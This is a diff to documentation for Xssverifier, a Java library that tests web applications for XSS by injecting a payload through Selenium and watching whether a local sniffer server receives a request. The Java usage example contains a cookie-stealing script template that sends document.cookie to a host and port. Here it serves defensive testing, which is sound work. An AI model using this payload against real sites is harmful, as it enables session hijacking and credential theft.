@@ -11,7 +11,9 @@ How does the XSS and XSS sniffers work? XSS injection is a value inserted into s
 
 To prove the wep applications are XSS-free Selenium test can be used (o you can instrument your already existing test with XSS check). In the beggining of test scenario insert the injected value to some input field. Then go through all application pages that show this kind of values with Selenium. If at least at one page XSS succeed, the sniffer will receive the cookie, the XSS succeed flag will be set. In the end of the test verify that sniffer was not requested at all.
 
-Usage example:
+In order to do ethicial XSS testing you require simple http server running on the localhost (i.e on the same machine as browser opening the application). The Xssverifier software runs on the top of lightweight nanohttpd java http server.
+
+===Usage example===
 ```java
 XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
 /* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/
@@ -46,3 +48,6 @@ while (!x.getXSSCookieHijacked("visited"))
 //the XSS host and resource were requested, some parameter was passed and this parameter is cookie named visited
 //so the particular cookie was hijacked and that was verified
 ```
+
+===Notes===
+The xssverifier library doesn't check availability of the ports on your local machine. You should ensure that port is not already bint before creating the sniffer.
